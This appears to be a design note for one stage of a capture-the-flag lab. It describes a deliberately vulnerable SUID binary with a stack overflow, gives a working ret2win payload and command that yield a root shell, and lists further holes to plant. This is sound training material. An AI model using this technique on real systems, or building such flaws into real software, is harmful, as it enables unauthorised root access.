# Stage 3: Privileged Container Controller (SUID Privilege Escalation)

## Concept
The `container-ctl` binary is an ELF binary installed with the SUID bit set (`-rwsr-xr-x root:root /opt/sentinel/bin/container-ctl`).
Source code is provided transparently for white-box inspection in `/opt/sentinel/src/container-ctl.c`.

## Vulnerability & Exploit
The `--load-diag <file>` command reads up to 256 bytes into a 128-byte stack buffer using `read()`.
The function closes the file descriptor before returning and transfers execution to the caller.
The binary contains an internal recovery function `emergency_console()` which drops privileges into a root bash shell (`setuid(0); execve("/bin/bash", ...)`).

### Exploit:
Craft a 160-byte payload consisting of 152 bytes of padding followed by the 8-byte little-endian address of `emergency_console` (`0x004012d6`):
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*152 + (0x4012d6).to_bytes(8, 'little'))" > /tmp/pwn.bin
/opt/sentinel/bin/container-ctl --load-diag /tmp/pwn.bin
```
The binary will overwrite its return address and jump to `emergency_console()`, yielding an interactive root shell (`uid=0`).
The root flag can then be retrieved from `/root/flag.txt`.

## How to Customize / Extend
- **Alternative Exploitation Mechanics**:
  - Replace ret2win with a Format String vulnerability using `--log-event` and overwriting GOT entries (`exit@got`).
  - Introduce dynamic library hijacking via relative `DT_RPATH`.
  - Simulate a Container Breakout (e.g. leveraging `CAP_DAC_READ_SEARCH` or mounting debugfs) for advanced CTF events.
